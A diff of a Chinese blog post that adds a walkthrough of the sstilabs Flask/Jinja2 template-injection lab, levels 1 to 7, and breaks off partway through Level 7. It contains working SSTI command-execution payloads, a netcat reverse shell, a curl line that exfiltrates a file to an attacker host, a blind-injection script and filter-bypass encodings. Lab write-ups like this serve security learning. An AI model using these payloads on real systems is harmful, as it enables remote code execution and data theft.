@@ -29,8 +29,25 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357782.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357586.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357320.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357234.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132359767.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507140000471.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358843.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358397.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358267.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358176.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358458.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358781.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358898.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358687.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358744.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358189.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358680.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132359450.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132359938.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132359832.png">
 <meta property="article:published_time" content="2025-07-13T14:25:00.000Z">
-<meta property="article:modified_time" content="2025-07-14T05:35:55.638Z">
+<meta property="article:modified_time" content="2025-07-14T05:51:53.055Z">
 <meta property="article:author" content="sangnigege">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary_large_image">
@@ -252,7 +269,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          643 字
+          4.2k 字
         
       </span>
     
@@ -263,7 +280,7 @@
         
         
         
-          6 分钟
+          36 分钟
         
       </span>
     
@@ -336,43 +353,378 @@
 <table>
 <thead>
 <tr>
-<th>类型</th>
-<th>名称&#x2F;方法</th>
-<th>描述</th>
-<th>典型用途或示例</th>
+<th align="left">类型</th>
+<th align="left">名称&#x2F;方法</th>
+<th align="left">描述</th>
+<th align="left">典型用途</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><strong>内置函数</strong></td>
-<td><code>lipsum</code></td>
-<td>用于生成 Lorem Ipsum 占位文本，默认提供多段随机文本。</td>
-<td>模板中填充测试内容：<code>&#123;&#123; lipsum() &#125;&#125;</code>。</td>
+<td align="left"><strong>内置函数</strong></td>
+<td align="left"><code>lipsum</code></td>
+<td align="left">用于生成 Lorem Ipsum 占位文本，默认提供多段随机文本。</td>
+<td align="left">模板中填充测试内容。</td>
 </tr>
 <tr>
-<td><strong>内置函数</strong></td>
-<td><code>url_for</code></td>
-<td>根据视图函数名生成对应的 URL 路径，支持动态参数。</td>
-<td>生成链接：<code>&lt;a href=&quot;&#123;&#123; url_for('home') &#125;&#125;&quot;&gt;Home&lt;/a&gt;</code>。</td>
+<td align="left"><strong>内置函数</strong></td>
+<td align="left"><code>url_for</code></td>
+<td align="left">根据视图函数名生成对应的 URL 路径，支持动态参数。</td>
+<td align="left">生成链接。</td>
 </tr>
 <tr>
-<td><strong>内置函数</strong></td>
-<td><code>get_flashed_messages</code></td>
-<td>获取通过 <code>flash()</code> 方法设置的闪现消息，通常用于一次性提示（如成功&#x2F;错误消息）。</td>
-<td>显示消息：<code>&#123;% for msg in get_flashed_messages() %&#125;&#123;&#123; msg &#125;&#125;&#123;% endfor %&#125;</code>。</td>
+<td align="left"><strong>内置函数</strong></td>
+<td align="left"><code>get_flashed_messages</code></td>
+<td align="left">获取通过 <code>flash()</code> 方法设置的闪现消息，通常用于一次性提示（如成功&#x2F;错误消息）。</td>
+<td align="left">显示消息。</td>
 </tr>
 <tr>
-<td><strong>内置对象</strong></td>
-<td><code>cycler</code></td>
-<td>Jinja2 的循环状态管理工具，用于跟踪迭代进度（如奇偶行标记）。</td>
-<td>标记交替行：<code>&#123;% set cycle = cycler("odd", "even") %&#125;</code>。</td>
+<td align="left"><strong>内置对象</strong></td>
+<td align="left"><code>cycler</code></td>
+<td align="left">Jinja2 的循环状态管理工具，用于跟踪迭代进度（如奇偶行标记）。</td>
+<td align="left">标记交替行。</td>
 </tr>
 <tr>
-<td><strong>内置对象</strong></td>
-<td><code>joiner</code></td>
-<td>Jinja2 的字符串拼接工具，自动处理分隔符（如逗号）。</td>
-<td>拼接列表：&#96;</td>
+<td align="left"><strong>内置对象</strong></td>
+<td align="left"><code>joiner</code></td>
+<td align="left">Jinja2 的字符串拼接工具，自动处理分隔符（如逗号）。</td>
+<td align="left">拼接列表。</td>
+</tr>
+<tr>
+<td align="left"><strong>内置对象</strong></td>
+<td align="left"><code>namespace</code></td>
+<td align="left">用于在模板中创建变量命名空间，避免变量冲突。</td>
+<td align="left">定义局部变量。</td>
+</tr>
+<tr>
+<td align="left"><strong>内置对象</strong></td>
+<td align="left"><code>config</code></td>
+<td align="left">包含 Flask 应用的配置信息（如 <code>SECRET_KEY</code>、数据库连接等）。</td>
+<td align="left">读取配置（需注意敏感信息泄露风险）。</td>
+</tr>
+<tr>
+<td align="left"><strong>内置对象</strong></td>
+<td align="left"><code>request</code></td>
+<td align="left">封装当前 HTTP 请求的详细信息（参数、头、Cookies 等）。</td>
+<td align="left">获取 GET 参数。</td>
+</tr>
+<tr>
+<td align="left"><strong>内置对象</strong></td>
+<td align="left"><code>session</code></td>
+<td align="left">用于读写用户会话数据（基于 Cookie 加密存储）。</td>
+<td align="left">存储用户状态。</td>
 </tr>
 </tbody></table>
+<p><strong>注意：</strong><code>.</code>可以与<code>[&#39;&#39;]</code>互相替换，比如<code>__globals__[&#39;os&#39;]</code>可以换为<code>__globals__.os</code>，所以下面两句是等价的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum.__globals__.os.popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357234.png" srcset="/img/loading.gif" lazyload alt="image-20250215214438190"></p>
+<h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h1><p>这关过滤<code>&#123;&#123;&#125;&#125;</code>，我们可以用<code>&#123;%%&#125;</code>代替，但是要注意使用print输出</p>
+<p><code>&#123;%print lipsum.__globals__.os.popen('cat flag').read()%&#125;</code></p>
+<p>或者</p>
+<p><code>&#123;%print(lipsum.__globals__.os.popen('cat flag').read())%&#125;</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132359767.png" srcset="/img/loading.gif" lazyload alt="image-20250215215323534"></p>
+<h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h1><p>这一关没回显。</p>
+<p>这种情况下我们往往考虑三种方法：</p>
+<ol>
+<li><p>反弹shell</p>
+</li>
+<li><p>带外注入（DNSlog、wget等）</p>
+</li>
+<li><p>盲注</p>
+</li>
+</ol>
+<p>我们每种都试一下。</p>
+<p><strong>第一种方法，</strong></p>
+<p>先在kali上开启监听<code>nc -lvp 7777</code></p>
+<p>然后执行<code>&#123;&#123;lipsum.__globals__.os.popen('nc 192.168.230.133 7777 -e /bin/bash')&#125;&#125;</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507140000471.png" srcset="/img/loading.gif" lazyload alt="image-20250714000047751"></p>
+<p>反弹shell成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358843.png" srcset="/img/loading.gif" lazyload alt="image-20250215220409424"></p>
+<p><strong>第二种方法，</strong></p>
+<p>sstilabs应该是不出网的，用DNSlog有些困难了</p>
+<p>这里在kali里用python开启一个http服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
+
+<p>然后去访问</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__.os.popen(<span class="hljs-string">&#x27;curl http://192.168.230.133/`cat flag | xxd -p`&#x27;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358397.png" srcset="/img/loading.gif" lazyload alt="image-20250215222441088"></p>
+<p>这里一开始单纯使用<code>cat flag</code>，但是发现特殊符号会消失（比如{}），所以改为16进制输出<code>cat flag | xxd -p</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358267.png" srcset="/img/loading.gif" lazyload alt="image-20250215222627980"></p>
+<p><strong>第三种，</strong></p>
+<p>这里直接写出脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">payload</span>):<br>    postdata = &#123;<br>        <span class="hljs-string">&#x27;code&#x27;</span>: payload<br>    &#125;<br>    start_time = time.time()<br>    response = requests.post(url, data=postdata)<br>    end_time = time.time()<br>    elapsed_time = end_time - start_time<br>    <span class="hljs-comment"># 如果响应时间超过1秒，则认为条件为真</span><br>    <span class="hljs-keyword">if</span> elapsed_time &gt; <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>password = <span class="hljs-string">&#x27;&#x27;</span><br>s = <span class="hljs-string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-comment"># 使用时间盲注的payload，通过执行系统命令 sleep 1 来引入延迟</span><br>        payload = <span class="hljs-string">&#x27;&#123;% if lipsum.__globals__.os.popen(&quot;cat flag&quot;).read()[&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;:&#x27;</span> + <span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;] == &quot;&#x27;</span> + c + <span class="hljs-string">&#x27;&quot; and lipsum.__globals__.os.popen(&quot;sleep 1&quot;).read() %&#125;&#123;% endif %&#125;&#x27;</span><br>        <span class="hljs-keyword">if</span> check(payload):<br>            password += c<br>            <span class="hljs-built_in">print</span>(password)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(password)<br><span class="hljs-comment">#需要修改URL和postdata</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358176.png" srcset="/img/loading.gif" lazyload alt="image-20250215224842500"></p>
+<h1 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h1><p>这一关过滤中括号</p>
+<p>我们第一关提到：<code>.</code>可以与<code>[&#39;&#39;]</code>互相替换，比如<code>__globals__[&#39;os&#39;]</code>可以换为<code>__globals__.os</code>，其实，<code>[&#39;&#39;]</code>还可以用<code>__getintm__(&#39;&#39;)</code>替换，即<code>__globals__[&#39;os&#39;]</code>可以换为<code>__globals__.__getitem__(&#39;os&#39;)</code>。此外还有更多的方法，这里把常见的获取键值或下标的方式进行总结（可以知道，这些都是等价的）。</p>
+<p><strong>获取键值或下标的方式</strong>（下面的__builtins__及0仅作为例子，实际应用请更换）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">dict</span>.__builtins__<br><span class="hljs-built_in">dict</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br><span class="hljs-built_in">dict</span>.get(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><span class="hljs-built_in">dict</span>.pop(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><span class="hljs-built_in">dict</span>.__getitem__(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><span class="hljs-built_in">dict</span>.setdefault(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><br><span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">list</span>.__getitem__(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">list</span>.pop(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>获取属性的方式</strong></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">().<span class="hljs-emphasis">__class__</span><br>()[&quot;<span class="hljs-emphasis">__class__</span>&quot;]<br>()|attr(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br>().<span class="hljs-emphasis">__getattribute__</span>(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br></code></pre></td></tr></table></figure>
+
+<p>payload之一<code>&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;</code>中虽然本来就没有中括号，</p>
+<p>但是第一关提到的<code>&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;</code>中有，</p>
+<p>根据上面，我们可以换为（其中，pop要谨慎使用，使用一次就会弹出，所以仅有一次机会，这里不建议使用）：</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.get</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.pop</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.__getitem__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.setdefault</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>可知，上面6句都是等价的。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358458.png" srcset="/img/loading.gif" lazyload alt="image-20250216105441416"></p>
+<h1 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h1><p>过滤单双引号</p>
+<p>这里我们要引入<code>request</code>：<code>request</code> 在 Flask 中可以访问基于 HTTP 请求传递的所有信息。</p>
+<p>此 <code>request</code> 并非 Python 的函数，而是在 Flask 内部的函数。</p>
+<table>
+<thead>
+<tr>
+<th>属性&#x2F;方法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>request.args.key</code></td>
+<td>获取 GET 请求中传入的 <code>key</code> 的值。</td>
+</tr>
+<tr>
+<td><code>request.values.参数名</code></td>
+<td>获取所有参数（包括 GET 和 POST）。</td>
+</tr>
+<tr>
+<td><code>request.cookies</code></td>
+<td>获取传入的 cookies 参数。</td>
+</tr>
+<tr>
+<td><code>request.headers</code></td>
+<td>获取请求头中的参数。</td>
+</tr>
+<tr>
+<td><code>request.form.key</code></td>
+<td>获取 POST 请求中传入的 <code>key</code> 的值（<code>Content-Type</code> 为 <code>application/x-www-form-urlencoded</code> 或 <code>multipart/form-data</code>）。</td>
+</tr>
+<tr>
+<td><code>request.data</code></td>
+<td>获取 POST 请求中传入的参数（<code>Content-Type:a/b</code> ）。</td>
+</tr>
+<tr>
+<td><code>request.json</code></td>
+<td>获取 POST 请求中传入的 JSON 参数（<code>Content-Type</code> 为 <code>application/json</code>）。</td>
+</tr>
+</tbody></table>
+<p>我们这里试试GET的</p>
+<p>我们的payload<code>&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;</code>中系统命令处有引号，所以我们替换为</p>
+<p><code>&#123;&#123;lipsum.__globals__.os.popen(request.args.k1).read()&#125;&#125;</code></p>
+<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358781.png" srcset="/img/loading.gif" lazyload alt="image-20250216114325149" style="zoom:67%;" />
+
+<p>试试POST</p>
+<p><code>code=&#123;&#123;lipsum.__globals__.os.popen(request.form.x1).read()&#125;&#125;&amp;x1=cat flag</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358898.png" srcset="/img/loading.gif" lazyload alt="image-20250216114210921"></p>
+<h1 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h1><p>这关过滤下划线</p>
+<p>这里我们讲一下flask常用过滤器：</p>
+<table>
+<thead>
+<tr>
+<th>flask常用过滤器</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>length()</code></td>
+<td>获取一个序列或者字典的长度并将其返回。</td>
+</tr>
+<tr>
+<td><code>int()</code></td>
+<td>将值转换为 <code>int</code> 类型。</td>
+</tr>
+<tr>
+<td><code>float()</code></td>
+<td>将值转换为 <code>float</code> 类型。</td>
+</tr>
+<tr>
+<td><code>lower()</code></td>
+<td>将字符串转换为小写。</td>
+</tr>
+<tr>
+<td><code>upper()</code></td>
+<td>将字符串转换为大写。</td>
+</tr>
+<tr>
+<td><code>reverse()</code></td>
+<td>反转字符串。</td>
+</tr>
+<tr>
+<td><code>replace(value,old,new)</code></td>
+<td>将 <code>value</code> 中的 <code>old</code> 替换为 <code>new</code>。</td>
+</tr>
+<tr>
+<td><code>list()</code></td>
+<td>将变量转换为列表类型。</td>
+</tr>
+<tr>
+<td><code>string()</code></td>
+<td>将变量转换成字符串类型。</td>
+</tr>
+<tr>
+<td><code>join()</code></td>
+<td>将一个序列中的参数值拼接成字符串，通常与 Python 内置的 <code>dict()</code> 配合使用。</td>
+</tr>
+<tr>
+<td><code>attr()</code></td>
+<td>获取对象的属性。</td>
+</tr>
+</tbody></table>
+<p>过滤器通过管道符号 (<code>|</code>) 与变量连接，并且在括号中可能有可选的参数。</p>
+<p>应对过滤下划线，我们以下几种方法：</p>
+<ol>
+<li><p>使用request方法（结合过滤器attr）</p>
+</li>
+<li><p>使用hex编码</p>
+</li>
+<li><p>使用unicode编码</p>
+</li>
+<li><p>使用base64编码(不建议用，仅python2支持)</p>
+</li>
+<li><p>格式化字符串</p>
+</li>
+</ol>
+<p><code>&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;</code>中有<code>__globals__</code></p>
+<p><strong>第1种，</strong></p>
+<p>这里我们需要使用过滤器attr，所以应该将</p>
+<p><code>&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;</code></p>
+<p>换为</p>
+<p><code>&#123;&#123;lipsum.__globals__.__getitem__('os').popen('ls').read()&#125;&#125;</code></p>
+<p>然后再转换</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum|attr(request.args.<span class="hljs-built_in">globals</span>)|attr(request.args.getitem)(<span class="hljs-string">&#x27;os&#x27;</span>)|attr(<span class="hljs-string">&#x27;popen&#x27;</span>)(<span class="hljs-string">&#x27;ls&#x27;</span>)|attr(<span class="hljs-string">&#x27;read&#x27;</span>)()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>注意GET传参<code>?globals=__globals__&amp;getitem=__getitem__</code></p>
+<p><strong>第2种，</strong></p>
+<p><code>_</code>编码后为<code>\x5f</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum[<span class="hljs-string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>].os.popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>第3种，</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum[<span class="hljs-string">&#x27;\u005f\u005fglobals\u005f\u005f&#x27;</span>].os.popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum|attr(<span class="hljs-string">&quot;\u005f\u005fglobals\u005f\u005f&quot;</span>)|attr(<span class="hljs-string">&quot;\u005f\u005fgetitem\u005f\u005f&quot;</span>)(<span class="hljs-string">&quot;os&quot;</span>)|attr(<span class="hljs-string">&quot;popen&quot;</span>)(<span class="hljs-string">&quot;cat flag&quot;</span>)|attr(<span class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>第4种，</strong></p>
+<p>（不建议，这里不好使）</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&#x27;X19jbGFzc19f&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19iYXNlX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19zdWJjbGFzc2VzX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))()|attr(<span class="hljs-name">&#x27;X19nZXRpdGVtX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))(<span class="hljs-name">213</span>)|attr(<span class="hljs-name">&#x27;X19pbml0X18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19nbG9iYWxzX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19nZXRpdGVtX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat flag&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>第5种，</strong></p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>[&quot;%c%cglobals%c%c&quot;%(95,95,95,95)].os.popen(<span class="hljs-name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&quot;%c%cglobals%c%c&quot;</span>%(<span class="hljs-name">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>))|attr(<span class="hljs-name">&quot;%c%cgetitem%c%c&quot;</span>%(<span class="hljs-name">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>))(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;cat flag&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h1><p>过滤点</p>
+<p>我们有两种方法：</p>
+<ol>
+<li>用中括号代替点（见第四关）</li>
+<li>用attr()绕过</li>
+</ol>
+<p><strong>第一种，</strong></p>
+<p><code>&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;</code></p>
+<p>改为</p>
+<p><code>&#123;&#123;lipsum['__globals__']['os']['popen']('ls')['read']()&#125;&#125;</code></p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust">&#123;&#123;lipsum[<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>5f<span class="hljs-char escape_">\x</span>5f<span class="hljs-char escape_">\x</span>67<span class="hljs-char escape_">\x</span>6c<span class="hljs-char escape_">\x</span>6f<span class="hljs-char escape_">\x</span>62<span class="hljs-char escape_">\x</span>61<span class="hljs-char escape_">\x</span>6c<span class="hljs-char escape_">\x</span>73<span class="hljs-char escape_">\x</span>5f<span class="hljs-char escape_">\x</span>5f&#x27;</span>][<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>6f<span class="hljs-char escape_">\x</span>73&#x27;</span>][<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>70<span class="hljs-char escape_">\x</span>6f<span class="hljs-char escape_">\x</span>70<span class="hljs-char escape_">\x</span>65<span class="hljs-char escape_">\x</span>6e&#x27;</span>](<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>6c<span class="hljs-char escape_">\x</span>73&#x27;</span>)[<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>72<span class="hljs-char escape_">\x</span>65<span class="hljs-char escape_">\x</span>61<span class="hljs-char escape_">\x</span>64&#x27;</span>]()&#125;&#125;<br>__globals__ <span class="hljs-number">5</span>F5F676C6F62616C735F5F \x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f<br>os <span class="hljs-number">6</span>F73 \x6f\x73<br>popen <span class="hljs-number">706</span>F70656E \x70\x6f\x70\x65\x6e<br>ls <span class="hljs-number">6</span>C73 \x6c\x73<br>read <span class="hljs-number">72656164</span> \x72\x65\x61\x64<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>第二种，</strong></p>
